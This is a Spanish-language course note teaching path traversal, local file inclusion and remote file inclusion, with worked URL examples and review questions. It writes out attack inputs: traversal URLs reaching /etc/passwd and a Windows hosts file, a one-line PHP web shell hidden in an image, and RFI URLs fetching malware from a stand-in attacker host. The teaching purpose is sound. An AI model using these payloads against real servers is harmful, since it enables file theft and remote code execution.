# 11 - Inclusión de Archivos (LFI, RFI, Path Traversal)

## 🎯 Objetivos
- Comprender los fallos estructurales a la hora de manipular archivos en el Backend.
- Entender el concepto de salto de directorios (Path/Directory Traversal).
- Diferenciar el LFI (Inclusión Local) del RFI (Inclusión Remota).

---

## 🧠 Concepto: La Lectura Descontrolada

El Path Traversal (o Salto de Directorios) y la Inclusión Local de Archivos (LFI) ocurren cuando la aplicación web le pregunta al usuario *"¿Qué archivo del disco duro querés que te abra?"*, pero el programador omitió prohibir el uso de símbolos del sistema operativo Linux/Windows.

El atacante utiliza los famosos puntos de salto de directorios **`../`** (Ir a la carpeta de atrás o padre, [[03 - Linux/03 - Navegación Básica (cd, ls, pwd)|visto en Linux]]). Al concatenar muchos de estos, el atacante se sale de la jaula web (la carpeta oficial donde la web fue instalada, como `/var/www/html/`) y viaja por el árbol de directorios del disco duro hasta leer archivos vitales de seguridad (como contraseñas y llaves SSH) en la raíz del servidor.

---

## 🗂️ 1. Directory Traversal (Lectura pura)

**El Escenario:**
Un blog lee artículos de noticias usando una variable (parámetro) en la URL:
> `http://blog.com/index.php?noticia=deportes.txt`
El Backend (PHP) va al disco duro a la carpeta preestablecida `/var/www/html/noticias/`, agarra el archivo llamado `deportes.txt` y lo muestra en la página web.

**El Ataque (Salto de Directorio):**
El atacante manipula la URL para romper la ruta preestablecida:
> `http://blog.com/index.php?noticia=../../../../../../etc/passwd`

**¿Qué procesó el servidor Linux?**
El programa intentó abrir: `/var/www/html/noticias/../../../../../../etc/passwd`.
Al ejecutarlo, la computadora obedeció los saltos:
- Salió de la carpeta `noticias` (`../`).
- Salió de la carpeta `html` (`../`).
- Salió de la carpeta `www` (`../`).
- Salió de la carpeta `var` (`../`).
- ¡Llegó a la Raíz del disco duro absoluta (`/`)! 
- Luego entró en la carpeta `/etc/` y abrió el archivo supremo de linux, el `passwd`, entregándole al atacante toda la lista de usuarios privilegiados de la computadora.

*(Mitigación: Los programadores deben filtrar y sanitizar rigurosamente los caracteres `.` y `/` en las peticiones que manipulen archivos).*

---

## 🐍 2. LFI (Local File Inclusion)

El LFI es un Directory Traversal en "Esteroides". Ocurre cuando el Backend no solo "lee" el archivo como texto, sino que **EJECUTA** el archivo como código interpretado. (Muy común en servidores `PHP` mal hechos mediante la función `include()`).

Si descubrís un LFI, tu objetivo es tratar de meter un malware localmente en algún rincón de la computadora de la víctima (por ejemplo, subiendo una imagen JPG en el apartado de tu Foto de Perfil, que contenga código PHP letal camuflado adentro de los metadatos de la imagen mediante esteganografía, ej: `<?php system($_GET['cmd']); ?>`).
Luego, explotás la inyección del LFI de la URL para que el servidor "incluya" o cargue forzosamente la foto de perfil que subiste, causando que la computadora mastique e interprete el código camuflado, dándote **Remote Code Execution (RCE)** (Control total).

---

## 🌐 3. RFI (Remote File Inclusion)

El RFI es el premio mayor pero está casi extinto. (Las configuraciones modernas de los servidores bloquean esto por defecto, ej: `allow_url_include=Off` en PHP).
En un RFI, no necesitas subir ninguna foto camuflada ni pelear saltando directorios (`../`).
La página vulnerable te permite incluir un archivo apuntando a una URL de Internet arbitraria.

> `http://blog.com/index.php?noticia=http://hacker.com/malware.php`

El servidor Backend no solo conecta con tu servidor remoto (como en un SSRF), sino que **descarga el código PHP de tu malware y lo ejecuta directamente en su propia memoria**. Dominio absoluto en un solo clic.

---

## 📌 Must Know (Imprescindible)
- Qué significan los caracteres `../` (El operador de salto "Retroceder un nivel de directorio"). Al encadenar varios, lográs navegar de reversa hasta salir de las carpetas restringidas hacia la raíz del S.O.
- El objetivo del **Path/Directory Traversal**: Lograr leer archivos altamente sensibles del Sistema Operativo que deberían estar fuera del alcance web, como `/etc/passwd` en Linux o `C:\Windows\win.ini` en Microsoft.
- Diferencia técnica: En el Directory Traversal normal solo se logra **Leer** textos. En el LFI/RFI se logra **Incluir y Ejecutar (Interpretar)** código, lo que desemboca frecuentemente en *RCE (Remote Code Execution)* si el atacante logra subir código.

---

## 🔄 Preguntas de repaso
1. Te encontrás testeando la aplicación web de una empresa financiera. Al modificar el parámetro `descargar?file=resumen.pdf` por `descargar?file=../../../../../../windows/system32/drivers/etc/hosts`, lograste visualizar por completo el archivo interno de hosts de la máquina de Windows. Sin embargo, no podés obligar al sistema a ejecutar ningún tipo de código dinámico. Basado en esta limitación y alcance puramente de lectura, ¿a qué clasificación exacta de vulnerabilidad acabas de toparte (Path Traversal puro, LFI, o RFI)?
2. En las técnicas avanzadas (Bypasses) para explotar vulnerabilidades de Path Traversal, un atacante se encuentra con que el desarrollador intentó asegurar la aplicación bloqueando rígidamente la combinación de caracteres `../`. Pensando en la manipulación y deformación de las peticiones HTTP mediante esquemas que la URL decodifica, ¿cómo podría el atacante transformar la cadena de texto `../` usando *URL Encoding* para lograr saltar la regla (filtro) del programador?
3. Un servidor web altamente desactualizado (PHP 4.0) permite modificar el parámetro de un módulo de noticias mediante: `page=http://mi_sitio_malicioso.com/backdoor.txt`. El servidor acude a tu enlace, descarga el archivo, e interpreta el código inyectado en su interior, otorgándote control de la máquina. Comparando las dinámicas de ataques, enumerá por qué esta técnica particular de inyección (RFI) es inherentemente más peligrosa que el LFI para la salud inmediata de la máquina objetivo.

**➡️ Siguiente nota:** [[12 - Laboratorio Teórico - Cazando Bugs (Bug Bounty)]]
